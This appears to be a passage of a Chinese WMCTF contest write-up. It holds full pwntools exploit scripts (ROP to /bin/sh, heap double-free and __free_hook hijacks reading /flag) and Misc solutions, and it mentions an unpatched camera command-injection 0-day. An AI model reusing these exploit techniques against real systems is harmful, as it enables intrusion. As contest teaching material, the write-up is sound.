2. cfgo-xxx都开启了pie，不过栈地址固定，且开头 0xc000000030 处必有指向ELF的地址，直接用这个来计算pie就行了 
3. 最后覆盖低位，跳回main函数（需要爆破4bit），再溢出一次，ret2syscall 
```python
#-*- coding: utf-8 -*- 
from pwn import * 

__author__ = '3summer' 
binary_file = './main' 
context.binary = binary_file 
context.terminal = ['tmux', 'sp', '-h'] 
elf = ELF(binary_file) 
libc = elf.libc 
context.log_level = 'error' 
def dbg(breakpoint): 
    # print os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).read() 
    # raw_input() 
    gdbscript = '' 
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[2], 16) if elf.pie else 0 
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint 
    gdbscript += 'c\n' 
    log.info(gdbscript) 
    gdb.attach(io, gdbscript) 
    time.sleep(1) 

def exploit(io): 
    s       = lambda data               :io.send(str(data))  
    sa      = lambda delim,data         :io.sendafter(str(delim), str(data)) 
    sl      = lambda data               :io.sendline(str(data)) 
    sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :io.recv(numb) 
    ru      = lambda delims, drop=True  :io.recvuntil(delims, drop) 
    irt     = lambda                    :io.interactive() 
    uu32    = lambda data               :u32(data.ljust(4, '\0')) 
    uu64    = lambda data               :u64(data.ljust(8, '\0')) 
    # dbg(0x129B79) 
    # dbg(0x12928A) 
    # payload = cyclic(105) 
    payload = flat('a'*0x40, 0xc000000030, 0x8, 0x8).ljust(0x60,'e') 
    # payload += p64(0x12345678) 
    payload += p16(0x4000+0x9360) 
    sla('Leave your name.\n',payload) 
    ru('red flag.') 
    ru('\xf0\x9f\x98\x82') 
    sl('wwws'*3000+'s'*21+'aaad'*3000) 
    ru('You win!!!')     
    ru('Your name is : ') 
    elf.address = u64(r(8)) - 0x21fea0  
    print 'leak ELF base :0x%x'%elf.address 
    if elf.address % 0x10000 != 0x4000: 
        raise EOFError 
    context.log_level = 'debug' 
    # raw_input() 
    mov_ptr_rdi = 0x00000000000d46ef#: mov qword ptr [rdi], rax; ret; 
    pop_rax = 0x0000000000079e89#: pop rax; ret; 
    pop_rdi = 0x000000000012a1e7#: pop rdi; ret; 
    syscall = 0x10A8BA 
    payload = flat('/bin/sh\x00'.ljust(0x1b0,'a'),  
    elf.address+pop_rax,  "/bin/sh\x00", 
    elf.address+pop_rdi, 0xc000000000, 
    elf.address+mov_ptr_rdi, 
    elf.address+syscall, 0, 0x3b, 0, 0, 0) 
    sla('Leave your name.\n',payload) 
    return io 

if __name__ == '__main__': 
    while True: 
        try: 
            if len(sys.argv) > 1: 
                io = remote(sys.argv[1], sys.argv[2]) 
            else: 
                io = process(binary_file, 0) 
            exploit(io) 
        except EOFError: 
            continue 
        io.interactive() 
```
## cfgo-CheckIn 

基本情况和cfgo-LuckyMaze一样，这题主要是为了给后面两个cfgo-xxx题目做铺垫，让大家先熟悉下栈溢出和“更彻底的strip”。由于是checkin，所以直接玩通100关迷宫就能触发栈溢出了，设置了一个好玩的地方就是开始位置的rune每4关会变一下，表示表情逐渐复杂的过程：😂😅😁😀🙂😐😑😯😟😞😖😳😨😱😭😵😩😠😡😤🙃😏😒🐮🍺。 

看到不少队跳到\xF0\xD0，还需要爆破4bit。其实没必要，\xCC（循环开头的位置）就是个非常不错的地址，跳过去后再把最后4关重新过一下就行了 

```python
#-*- coding: utf-8 -*- 
from pwn import * 

__author__ = '3summer' 
binary_file = './main' 
context.binary = binary_file 
context.terminal = ['tmux', 'sp', '-h'] 
elf = ELF(binary_file) 
# context.log_level = 'debug' 
def dbg(breakpoint): 
    # print os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).read() 
    # raw_input() 
    gdbscript = '' 
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[2], 16) if elf.pie else 0 
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint 
    gdbscript += 'c\n' 
    log.info(gdbscript) 
    gdb.attach(io, gdbscript) 
    time.sleep(1) 
dirs = [lambda x, y: (x + 1, y), 
        lambda x, y: (x - 1, y), 
        lambda x, y: (x, y - 1), 
        lambda x, y: (x, y + 1)] 
def mpath(stack, maze, x1, y1, x2, y2): 
    # stack = [] 
    stack.append((x1, y1)) 
    while len(stack) > 0: 
        curNode = stack[-1] 
        if curNode[0] == x2 and curNode[1] == y2: 
            #到达终点 
            # for p in stack: 
            #     print(p) 
            return True 
        for dir in dirs: 
            nextNode = dir(curNode[0], curNode[1]) 
            if maze[nextNode[0]][nextNode[1]] == 0: 
                #找到了下一个 
                stack.append(nextNode) 
                maze[nextNode[0]][nextNode[1]] = -1  # 标记为已经走过，防止死循环 
                break 
        else:#四个方向都没找到 
            maze[curNode[0]][curNode[1]] = -1  # 死路一条,下次别走了 
            stack.pop() #回溯 
    print("没有路") 
    return False 
def exploit(io): 
    s       = lambda data               :io.send(str(data))  
    sa      = lambda delim,data         :io.sendafter(str(delim), str(data)) 
    sl      = lambda data               :io.sendline(str(data)) 
    sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :io.recv(numb) 
    ru      = lambda delims, drop=True  :io.recvuntil(delims, drop) 
    irt     = lambda                    :io.interactive() 
    uu32    = lambda data               :u32(data.ljust(4, '\0')) 
    uu64    = lambda data               :u64(data.ljust(8, '\0')) 
     
    Wall   = '⬛' 
    Empty  = '⬜' 
    Finish = '🚩' 
    emoji = "😂😅😁😀🙂😐😑😯😟😞😖😳😨😱😭😵😩😠😡😤🙃😏😒🐮🍺" 
    # dbg(0x1192B2) 
    for i in range(100): 
        success('level%d'%(i+1)) 
        Start = emoji[ i-(i%4) : i-(i%4)+4 ] 
        ru('You will get flag when reaching level 100. Now is level %d\n' % (i+1)) 
        maze = io.recvrepeat(0.03*pow(i+1,0.5)).strip() 
        m = maze.replace(Start,'S').replace(Finish,'F').replace(Empty,'0').replace(Wall,'1') 
        mz = [] 
        maze = m.split('\n') 
        for h in range(len(maze)): 
            ae = [] 
            for l in range(len(maze[h])): 
                block = maze[h][l] 
                if block == '1': 
                    ae.append(1) 
                if block == '0': 
                    ae.append(0) 
                if block == 'F': 
                    ae.append(0) 
                    fX, fY = l, h 
                if block == 'S': 
                    ae.append(0) 
                    sX, sY = l, h 
            mz.append(ae) 
        path = [] 
        mpath(path,mz,sY,sX,fY,fX) 
        a1 = path[0] 
        path = path[1:] 
        p = '' 
        for a2 in path: 
            if a1[0] == a2[0]+1: 
                p += 'w' 
            if a1[0] == a2[0]-1: 
                p += 's' 
            if a1[1] == a2[1]+1: 
                p += 'a' 
            if a1[1] == a2[1]-1: 
                p += 'd' 
            a1 = a2 
        sl(p) 
    ru('You win!!!\nLeave your name:\n') 
    # sl(cyclic(300)) 
    sl( 
        flat( 
            cyclic(112), 
            0xc000000030, 0x8, 0x8, 
            'a'*0x88, 
            p8(0xcc) 
        ) 
    ) 
    ru('Your name is : ') 
    elf.address = u64(r(8)) - 0x206ac0  
    success('leak ELF base :0x%x'%elf.address) 
    for i in range(96,100): 
        success('level%d'%(i+1)) 
        Start = '\x00' 
        ru('You will get flag when reaching level 100. Now is level %d\n' % (i+1)) 
        maze = io.recvrepeat(0.03*(i+1)).strip() 
        m = maze.replace(Start,'S').replace(Finish,'F').replace(Empty,'0').replace(Wall,'1') 
        mz = [] 
        maze = m.split('\n') 
        for h in range(len(maze)): 
            ae = [] 
            for l in range(len(maze[h])): 
                block = maze[h][l] 
                if block == '1': 
                    ae.append(1) 
                if block == '0': 
                    ae.append(0) 
                if block == 'F': 
                    ae.append(0) 
                    fX, fY = l, h 
                if block == 'S': 
                    ae.append(0) 
                    sX, sY = l, h 
            mz.append(ae) 
        path = [] 
        mpath(path,mz,sY,sX,fY,fX) 
        a1 = path[0] 
        path = path[1:] 
        p = '' 
        for a2 in path: 
            if a1[0] == a2[0]+1: 
                p += 'w' 
            if a1[0] == a2[0]-1: 
                p += 's' 
            if a1[1] == a2[1]+1: 
                p += 'a' 
            if a1[1] == a2[1]-1: 
                p += 'd' 
            a1 = a2 
        sl(p) 
    ru('You win!!!\nLeave your name:\n') 
    mov_ptr_rdi = 0x00000000000cf53f#: mov qword ptr [rdi], rax; ret; 
    pop_rax = 0x0000000000074e29#: pop rax; ret; 
    pop_rdi = 0x0000000000109d3d#: pop rdi; ret; 
    syscall = 0xFFE2A 
    sl( 
        flat( 
            cyclic(112), 
            0xc000000030, 0x8, 0x8, 
            'a'*0x88, 
            elf.address+pop_rax,  "/bin/sh\x00", 
            elf.address+pop_rdi, 0xc000000000, 
            elf.address+mov_ptr_rdi, 
            elf.address+syscall, 0, 0x3b, 0, 0, 0 
        ) 
    ) 
    return io 

if __name__ == '__main__': 
    if len(sys.argv) > 1: 
        io = remote(sys.argv[1], sys.argv[2]) 
    else: 
        io = process(binary_file, 0) 
    exploit(io) 
    io.interactive() 


```


## roshambo 

这里出题人犯了一个低级错误，导致无限堆溢出，这是我的锅。 

首先先说一下，延迟可能会导致exp无法跑通，要多打几次 

这是简单的在线聊天猜拳游戏（并不是）因为协议是自己写的，所以需要抓包逆向一下，抓几个包之后大概就能分析出大概的样子了。 

程序中通过管道连接，通过read、write来交互数据。其中的功能有猜拳和聊天功能。主线程输入数据，子线程接受数据并处理。其主要子线程和主线程中有一个变量是公用的，通过sleep导致指针被替换，然后子线程和主线程各自free一次，导致double free。 

预期解是通过sleep导致double free，因为存在read堵塞，所以需要选手自己把控输入的时间，要根据情况去判断是否出现两个read竞争，然后如何解决。其实解决的办法就是再发送一串字符串即可。 

这里show功能和游戏结束功能还可能存在竞争导致的堆溢出，不过我没有进一步深入研究了。 

```plain
# -*- coding: utf-8 -*- 
from pwn import * 
import sys 
import hashlib 
import binascii 
context.log_level = "DEBUG" 
context.arch = "amd64" 
if(len(sys.argv) > 1): 
    host = remote(sys.argv[1],int(sys.argv[2],10)) 
    client = remote(sys.argv[1],int(sys.argv[2],10)) 
else: 
    host = process("./roshambo") 
    client = process("./roshambo") 
elf = ELF("./roshambo") 
lib = ELF("./libc-2.27.so") 
context.terminal = ['tmux','sp','-h'] 
hs       = lambda data               :host.send(str(data)) 
hsa      = lambda delim,data         :host.sendafter(str(delim), str(data)) 
hsl      = lambda data               :host.sendline(str(data)) 
hsla     = lambda delim,data         :host.sendlineafter(str(delim), str(data)) 
hr       = lambda numb=4096          :host.recv(numb) 
hru      = lambda delims, drop=True  :host.recvuntil(delims, drop) 
hirt     = lambda                    :host.interactive() 
cs       = lambda data               :client.send(str(data)) 
csa      = lambda delim,data         :client.sendafter(str(delim), str(data)) 
csl      = lambda data               :client.sendline(str(data)) 
csla     = lambda delim,data         :client.sendlineafter(str(delim), str(data)) 
cr       = lambda numb=4096          :client.recv(numb) 
cru      = lambda delims, drop=True  :client.recvuntil(delims, drop) 
cirt     = lambda                    :client.interactive() 
command = { 
        "EXCHANGE_NAME_SENDER_RPC_COMMAND"  :1, 
        "EXCHANGE_NAME_RECEIVER_RPC_COMMAND":2, 
        "SHOW_RPC_COMMAND"                  :3, 
        "GAME_START_RPC_COMMAND"            :4, 
        "ROCK_RPC_COMMAND"                  :5, 
        "PAPER_RPC_COMMAND"                 :6, 
        "SCISSORS_RPC_COMMAND"              :7, 
        "GAME_OVER_RPC_COMMAND"             :8 
        } 
def RPC(idx,data): 
    global command 
    hash_data = binascii.a2b_hex(hashlib.sha256(data).hexdigest()) 
    payload  = '[RPC]' 
    payload  = payload.ljust(8,'\x00') 
    payload += p64(command[idx]) 
    payload += p64(len(data)) 
    payload += hash_data 
    payload += data 
    return payload 
def leave(sh,size,content): 
    sh.sendlineafter("size: ",str(size)) 
    sh.sendafter("what do you want to say?",content) 
hsla("Your Mode: ","C") 
csla("Your Mode: ","L") 
hsla("Authorization: ","NanMengNiuBi") 
hru("Your room: ") 
room_idx = hru("\n").strip() 
csla("Your room: ",room_idx) 
hsla(":","xynm") 
csla(":","glzjin") 
cru("glzjin >>") 
hsla("xynm >>",RPC('EXCHANGE_NAME_SENDER_RPC_COMMAND',"")) 
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND','')) 
sleep(1) 
hsa("xynm >>",RPC('SHOW_RPC_COMMAND','a' * 0x88)) 
csla("a" * 0x87,RPC('GAME_OVER_RPC_COMMAND','')) 
leave(host  ,0x88,'\x12' * 0x87) 
leave(client,0x88,'\x13' * 0x87) 
cru("glzjin >>") 
sleep(1) 
for i in range(7): 
    hsa("xynm >>",RPC('GAME_START_RPC_COMMAND','')) 
    sleep(1) 
    hsa("xynm >>",RPC('SHOW_RPC_COMMAND','a' * 0x78)) 
    csla("a" * 0x77,RPC('GAME_OVER_RPC_COMMAND','')) 
    leave(host  ,0x88,'\x12' * 0x87) 
    leave(client,0x88,'\x13' * 0x87) 
    cru("glzjin >>") 
    sleep(1) 
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND','')) 
sleep(5) 
csla('start!\n',RPC('GAME_OVER_RPC_COMMAND','')) 
hsla("xynm >>",p64(0xdeadbeefdeadbeef)) 
leave(host,0x88,'\x14' * 0x30) 
leave(client,0x18,'\x15' * 0x8) 
cru('\x15' * 0x8) 
libc_base = u64(cr(6).ljust(8,'\x00')) - 88 - 0x18 - lib.sym['__malloc_hook'] 
lib.address = libc_base 
sleep(4) 
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND','')) 
sleep(1) 
payload  = p64(lib.sym['__free_hook'] - 8) * 3 
payload += p64(0x51) 
payload = payload.ljust(0x88,'\x00') 
hsa("xynm >>",RPC('SHOW_RPC_COMMAND',payload)) 
csla('start!\n',RPC('SHOW_RPC_COMMAND',p64(0xdeadbeefdeadbeef))) 
csla('glzjin >>',RPC('GAME_OVER_RPC_COMMAND','')) 
payload  = p64(lib.sym['__free_hook'] - 8) * 3 
payload += p64(0x51) + p64(lib.sym['__free_hook'] - 8) 
payload = payload.ljust(0x88,'\x00') 
leave(client,0x88,payload) 
sleep(2) 
hsla("xynm >>",p64(0xdeadbeefdeadbeef)) 
leave(host,0x88,'aaaaa\n') 
sleep(3) 
payload  = p64(lib.sym['__free_hook'] - 8) * 3 
payload += p64(0x61) 
payload = payload.ljust(0x88,'\x00') 
hsa("xynm >>",RPC('SHOW_RPC_COMMAND',payload)) 
sleep(3) 
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND','')) 
csla('glzjin >>',RPC('GAME_OVER_RPC_COMMAND','')) 
csla("size",str(0x88)) 
leave(host,0x88,p64(0xdeadbeefdeadbeef)) 
pop_rdi_ret = 0x000000000002155f 
pop_rsi_ret = 0x0000000000023e6a 
pop_rdx_ret = 0x0000000000001b96 
pop_rdx_rsi_ret = 0x00000000001306d9 
pop2_ret = 0x000000000007dd2e 
pop4_ret = 0x000000000002219e 
ret = 0x00000000000b17c5 
payload  = p64(lib.sym['__free_hook'] + 0x18) * (0xA8 / 8) 
payload += p64(ret+libc_base) 
payload  =  payload.ljust(0x100,'\x00') 
hsa("xynm >>",RPC('SHOW_RPC_COMMAND',payload)) 
sleep(3) 
payload  = '/flag'.ljust(8,'\x00') 
payload += p64(lib.sym['setcontext'] + (0x520A5 - 0x52070)) 
payload += p64(0xcafecafecafecafe) * 2 
payload += p64(pop_rdi_ret + libc_base) + p64(0x0) 
payload += p64(pop_rdx_ret+libc_base) + p64(0x300) 
payload += p64(lib.sym['read']) * 9 
payload = payload.ljust(0x88,'\x11') 
csla("what do you want to say?",payload) 
payload = 'a' * 0x30 
payload += p64(pop_rdi_ret + libc_base) + p64(lib.sym['__free_hook'] - 8) 
payload += p64(pop_rsi_ret + libc_base) + p64(0) 
payload += p64(lib.sym['open']) 
payload += p64(pop_rdi_ret + libc_base) + p64(5) 
payload += p64(pop_rsi_ret + libc_base) + p64(lib.sym['__free_hook'] + 0x100) 
payload += p64(pop_rdx_ret + libc_base) + p64(0x200) 
payload += p64(lib.sym['read']) 
payload += p64(pop_rdi_ret + libc_base) + p64(lib.sym['__free_hook'] + 0x100) 
payload += p64(lib.sym['puts']) 
sleep(2) 
csl(payload) 
cirt() 

```
## babymac 

mac下常规的堆溢出，实现任意地址写任意指针。 

劫持note_list，实现libc leak和任意地址写，写free为system。然后free一个"/readflag"的chunk即可 

出题人为了防止搅屎，所以只能通过system("/readflag")来获取flag 

```plain
from pwn import * 
import sys 
context.log_level = "DEBUG" 
local = False 
ip = sys.argv[1] 
port = int(sys.argv[2],10) 
if local: 
	sh = process("./babyMac") 
else: 
	sh = remote(ip,port) 
s       = lambda data               :sh.send(str(data)) 
sa      = lambda delim,data         :sh.sendafter(str(delim), str(data)) 
sl      = lambda data               :sh.sendline(str(data)) 
sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :sh.recv(numb) 
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop) 
irt     = lambda                    :sh.interactive() 
uu32    = lambda data               :u32(data.ljust(4, b'\x00')) 
uu64    = lambda data               :u64(data.ljust(8, b'\x00')) 
def add(size): 
	sla(":","A") 
	sla("?",str(size)) 
def edit(idx,content): 
	sla(":","E") 
	sla("?",str(idx)) 
	sa("?",str(content)) 
def show(idx): 
	sla(":","S") 
	sla("? ",str(idx)) 
def free(idx): 
	sla(":","D") 
	sla("?",str(idx)) 
def magic(idx,content): 
	sla(":","M") 
	sla("?",str(idx)) 
	sa("?",content) 
def getText(): 
	sa("?","WMCTF") 
while True: 
	try: 
		getText() 
		ru("0x") 
		text = int(ru("\n").strip(),16) - 0x1510 
		note_list = text + 0x3080 
		puts_got_offset = 0x3050 
		puts_got = text + puts_got_offset 
		printf_plt = 0x1A2A + text 
		free_got = text + 0x3028 
		log.success("text => " + hex(text)) 
		log.success("puts_got => " + hex(puts_got)) 
		for i in range(7): 
			add(0x40) 
		payload = '/readflag\x00' 
		edit(6,payload) 
		free(0) 
		free(2) 
		free(4) 
		add(0x40) 
		payload = 'a' * 0x40 
		payload += p64(note_list) + p64((note_list >> 4))[0:7] 
		magic(1,payload) 
		add(0x40) 
		payload  = p64(note_list) + p64(0x80) 
		payload += p64(puts_got) + p64(0x80) 
		payload += p64(free_got) + p64(0x80) 
		edit(0,payload) 
		show(1) 
		puts = uu64(sh.recv(6)) 
		puts_offset = 0x3F630 
		libsystem_c = puts - puts_offset 
		system = libsystem_c + 0x77FDD 
		execve_onegadget = 0x23F9E + libsystem_c 
		one_gadget = 0x23F97 + libsystem_c 
		#one_gadget = 0x23F97 + libsystem_c 
		log.success("puts        => " + hex(puts)) 
		log.success("libsystem_c => " + hex(libsystem_c)) 
		log.success("system => " + hex(system)) 
		if not (puts > 0x7e0000000000 and puts < 0x7FFFFFFFFFFF): 
		#if puts == 0x616161616161: 
			sh.close() 
			if local: 
				sh = process("./babyMac") 
			else: 
				sh = remote(ip,port) 
			continue 

		edit(2,p64(system)) 
		free(6) 
		#sh.recvuntil("flag{test}") 
		#debug() 
		sh.interactive() 
	except EOFError: 
		sh.close() 
		if local: 
			sh = process("./babyMac") 
		else: 
			sh = remote(ip,port) 
		continue 
sh.interactive() 

```
![图片](https://uploader.shimo.im/f/kgszdNy8PAopO5ny.png!thumbnail)

## mengyedekending 

使用了C#编写的栈溢出，预期解是覆盖掉下标变量进而间接修改掉核心标志量，当核心标志被修改即可触发后门，由于没有考虑过多`\r`的处理导致存在一个无限栈溢出，另外由于C#使用的是宽字节，因此输入也会造成一定的阻碍。 

[EXP.zip](https://uploader.shimo.im/f/IFrJZ9u5ePax1AZi.zip)

P.S. 其实最一开始的出题思路是C#委托劫持，但是没有时间再去调了。 

# **Misc：** 

## IPcam 

题目给了摄像头固件，通过binwalk -e 会发现无法解包。这里仔细看会发现第三块文件存储为大端序。 

![图片](https://uploader.shimo.im/f/6SNT6TLxBct3UAt3.png!thumbnail)

可以通过DD命令将第三块提取出来，再使用objcopy工具将其转换为小端序。 

![图片](https://uploader.shimo.im/f/PFtXbSsuWB2Eliph.png!thumbnail)

到这里我们便能得到摄像头关键程序p2pcam，丢进IDA进行逆向。这里漏洞较多，可以用来拿flag的一共有三个，分别是栈溢出、文件读取和命令注入。这里栈溢出打的话会比较麻烦，不少师傅便是卡在了这里。命令注入则会相对较为简单，同时这也是咱们的预期解。另外由于该漏洞属于某摄像头0day，厂商暂未修复。这里不纰漏漏洞的具体细节，有兴趣的师傅可以自行挖掘 

![图片](https://uploader.shimo.im/f/YPwxUCpSgee6YzWu.png!thumbnail)

这里只能看到一半的flag，接下来便是第二个flag。这个flag比较简单，通过扫描可以发现摄像头开了554端口 

![图片](https://uploader.shimo.im/f/ys2tcQYtoUBd4g7M.png!thumbnail)

![图片](https://uploader.shimo.im/f/mPImbNPFMr9a1RuP.png!thumbnail)

## Dalabengba 

### 前言 

整道题目的背景为达拉崩吧这首歌，在出题之前就想弄一道rpg的游戏题，苦于没有什么好的剧情构思，于是想到了达拉崩吧，非常完美的勇者斗恶龙剧情（手动滑稽），游戏中一些地图的设计和游戏剧情的构思都较完整的还原了达拉崩吧，所以其实在做题中没什么思路的时候可以去看看歌词对照一下2333 

### 题目描述 

Play game and get flag！ 

The flag was divided into three parts, the format is **WMCTF{part1+part2=part3}** . 

### 题目详解 

下载附件解压，可得一个exe文件，打开后发现报错，无法运行，所以首先我们需要将文件解包，检查其不可运行的原因，解题具体过程如下 

#### 解包 

关于rpg游戏的解包，百度（谷歌）即可，我用到工具为 **EnigmaVBUnpacker** ，不过需要注意的是在解包后需要先修改文件夹的名称，不然含有 `%` 会导致游戏无法正常运行，其中 **part2.jpg** 和 **s3cr3t.crypto** 两个文件分别对应了flag的part2、part3两部分 

#### 求key 

解包后就可以看到一个完整的rpg游戏的内部文件结构了，打开 **www** 文件夹，其中全部都是有关游戏的文件，再打开其中的 **img** 或者 **audio** 可以发现其中文件都被加密，而有关加密的key信息在 **data** 文件夹的 **System.json** 中，打开后翻到最后发现 `encryptionKey` 一项中为空，所以需要先求得key 

有关rpg文件解密，有相关工具 **RPG-Maker-MV-Decrypter** ，在GitHub里可以看到 [工具源码](https://github.com/Petschko/RPG-Maker-MV-Decrypter/blob/master/scripts/Decrypter.js)，其中很详细的写了文件加解密原理，被加密文件开头被填充了固定的16字节（解密时需要移除） 

![图片](https://uploader.shimo.im/f/Wn1QbaEsMXWpcmFO.png!thumbnail)

而后属于原本文件的开头16字节与key进行异或，即完成了文件加（解）密 ![图片](https://uploader.shimo.im/f/cKmjUOOBh8kTI5fM.png!thumbnail)

其中key也是长度为16字节，所以用rpgmaker新建一个项目，找到其中任意一个对应未被加密的文件，用其开头16字节与被加密文件的开头17~32字节xor，即可得到key 

```python
a = '4F 67 67 53 00 02 00 00 00 00 00 00 00 00 04 EE'.replace(' ','') 
b = 'B8 22 F5 61 8A 14 8C F8 58 E7 27 00 78 D4 F2 45'.replace(' ','') 
​ 
key = '' 
for i in range(0,len(a),2): 
    key += hex(int(a[i:i+2],16) ^ int(b[i:i+2],16))[2:].zfill(2) 
​ 
print key 
​ 
# f74592328a168cf858e7270078d4f6ab 
```
将得到的key写到 `encryptionKey` 中，即可正常打开游戏 
#### 游戏剧情 

剧情大体和达拉崩吧中所描述的相同，首先诞生在城镇，去王宫和国王对话结束后即可开启冒险，其中城镇的 **道具商店** 中有一个hint，在最后会用到（不知道影响也不大） 

![图片](https://uploader.shimo.im/f/wyt7rHoACIlCFeLd.png!thumbnail)

总体路线为：城镇 → 森林 → 洞窟 → 美丽村庄 → 山洞 → 巨龙城堡 

其中森林、洞窟、山洞、巨龙城堡都会遇到怪，怪的数量很多但大多数都可以逃跑（只有少数我自己加的怪无法逃跑2333），可以用CE修改器等外挂软件闯关，也可以手动闯关，其中在洞窟那个地图中有四根柱子，需要在每根柱子前按下确定键，才能激活通向下一个地图的传送门 

我制作游戏时用的是 **rpg maker mv** ，用其新建一个项目，将解包得到的data文件夹替换新建项目的data文件夹，再打开项目也可以看到游戏的整体设计，但是一些关键信息都被加密，无法直接查看，只有在游戏中可以看到，或者想办法把它解密（就是不玩游戏的非预期解） 

偏远美丽村庄中每一间能看到门房子都可以进去，其中宝箱里含有part2的hint，编号①~⑦，组合可以得到 

```plain
Do you know java 
```
地图上也能看到part2的字样，提示此地图中含有part2相关的信息 
![图片](https://uploader.shimo.im/f/soBgH2gZWnEEPSdL.png!thumbnail)

最后在巨龙城堡3F打败巨龙（不用挂也可以打败）得到道具 **巨龙的鳞片** ，再和公主对话后就会被传送回王宫，和国王对话可得到关键信息 

```plain
dwssap:54651A6252C6f5f653f55E62704f55F70395 
你需要先删去其中的大写字母 
```
其中 `dwssap` 是 `passwd` 的倒序，逆序后去除大写字母，再 `decode('hex')` ，即可得到passwd 
```plain
Y0u_@re_5o_bRaVE 
```
这个passwd用来解 **s3cr3t.crypto** 
#### part1 

再去 **道具商店** 即可看到魔女（之前在道具商店提到过hint），和魔女对话上交 **巨龙的鳞片** 后可以传送到 **空中神殿** ，进入神殿内部，观察8个人物行走路径，可以得到 **part1** 部分flag，其中也有两个关于这部分flag的hint 

![图片](https://uploader.shimo.im/f/5FVgNhGC867nswVk.png!thumbnail)

![图片](https://uploader.shimo.im/f/9TTLQHF7brsIB57R.png!thumbnail)

触发hint条件：踩龙雕塑周围四个地砖中被圈起来的两个（要按确认键） 

```plain
如果没有什么头绪，不妨去镜子里看看帅气的自己！ 
镜子有几面呢？ 
```
在可以看到的五面镜子前按确认键都没有hint，所以想到在五面镜子的对面 
![图片](https://uploader.shimo.im/f/nIw4zMuI40Jk3NDC.png!thumbnail)

在两个蓝色圈处按确认键即可分别得到这两个hint 

人物行走轨迹如下图 

![图片](https://uploader.shimo.im/f/7oV9LOoSsL48GsLq.png!thumbnail)

再结合hint，得到part1部分： `Pr1nCe5s` （有些不太明显，多试几次就好） 

当然这部分flag在替换data的新建项目中可以直接查看，人物行走路径的指令并没有被加密，所以可以直接根据指令将flag在地图中画出来（如上图），设计那些hint机关是为了给纯游戏（做题）的师傅们带来更好的游戏体验 

#### part2 

本部分flag的考点为 **水印盲提取** ，在出这道题的时候，还没有进行安恒六月赛，在六月赛中给出了一道水印盲提取的题，用那道题的工具可以模模糊糊的看到本题图片中加了水印，结合在村庄中得到的hint： `Do you know java` ，在Google搜索 **java 盲水印** ，可以在GitHub上找到一个 [项目](https://github.com/ww23/BlindWatermark)，用这个项目进行DCT模式图片水印解码，可以得到一个缺少中心识别码的 **Aztec码** 

```plain
java -jar BlindWatermark-master-v0.0.3.jar decode -c part2.jpg out.jpg 
```
![图片](https://uploader.shimo.im/f/Lgl02ODbFICybMRt.png!thumbnail)

将中心识别码补好后在线网站扫描，即可得到part2： `W@rR1or` 

#### part3 

文件后缀为 `crypto` ，Google搜索可知是用 **Encrypto** 这个工具加密，用刚刚得到的passwd解密后得到 **s3cr3t.hidden** 这个文件，直接Google关键词 `s3cr3t` ，就可以在GitHub上查到这个 [项目](https://gist.github.com/aanoaa/1408846)，下载下来用其解密一下，即可得到part3部分flag 

![图片](https://uploader.shimo.im/f/s2t2vHsxLEOtrGEr.png!thumbnail)

当然如果没get到工具的话也可以手撕加密（有好几支做出来的队伍都是手撕出来的，我也从中学习了下手撕的方法2333） 

文本中有两种空白字符，分别替换成1和0，可以得到 

```plain
100110101111011010101110000001000001011010000110011011101010011000000100011001101111011010101110011101100010011000000100100101100010111010000100100001001000010010000100100001001000010001010000 
01010000 
01010000 
01010000 
000011101000011001001110001011101100110001011100111010100001011001001110010010100100111001001110010011100111111001010000 
```
逆序解二进制，将得到结果再逆序，即可完成解密 
#### flag 

最终将得到的三部分flag按照格式拼在一起，即是最终的flag 

```plain
WMCTF{Pr1nCe5s+W@rR1or=WhrRrrr~} 
```
至于格式中为什么是 `+` 和 `=` ，也是为了更符合达拉崩吧的背景2333 
### 总结 

整道题比较难的地方在于最开始求得 `encryptionKey` ，之后的考点在网上都可以直接搜到，只要有足够的时间，完全可以解决本题，当然享受游戏也不失为一种 解 题方式  

## XMAN_Happy_birthday! 

打开题目看到文件名“daolnwod.zip”，看到文件结尾的4B 50不难想到将文件reverse后就能得到压缩包和flag 

## Performance_artist 

简单的图像分类， 没想到大家都直接用眼睛做了。。 ![图片](https://uploader.shimo.im/f/J2TEW4LscYpGT89l.jpg!thumbnail)还好长度不是太长（压缩包里放个图片还做不做了emm） 

按说把hint放的数据集放搜索引擎找一下就有很多带详解的代码了。为了降低难度，题目都是直接用的训练集，没有加噪音，也就是说不用考虑过拟合问题。（好像师傅们都是把图分出来直接匹配数据集去了= =） 

代码见链接： 

[https://gist.github.com/yikongge/28aaf0aca7308bf3bc8a5a708ba14537](https://gist.github.com/yikongge/28aaf0aca7308bf3bc8a5a708ba14537)

[https://share.weiyun.com/3u6l23rJ](https://share.weiyun.com/3u6l23rJ)

恢复好的文件链接： [https://share.weiyun.com/pSxojEjM](https://share.weiyun.com/pSxojEjM)

哦 差点忘了 png图片有修改图片高度，压缩包进行了伪加密（比赛时有师傅发现图片显示的zip没有文件尾，没想到改png高度emm 个人感觉这两个知识点国内很常见 - -） 

## Music_game 

念就好了。可能是数据集问题（wtcl），国人的发音识别的不太好，google翻译外放吧 

（有看到有师傅用burp 应该也没问题 

## Music_game2 

经过前面两个开胃菜的预热，前期准备工作应该完成了。 

这道题说白了就是在音频里掺入些噪音，让后台的神经网络作出错误的判断。玩过上一题的师傅都知道，这个识别有点拉。 

既然是掺杂，我比赛前突发奇想了一种“佛系解题”法 

![图片](https://uploader.shimo.im/f/q1GnDWkWxiPpbOn4.png!thumbnail)

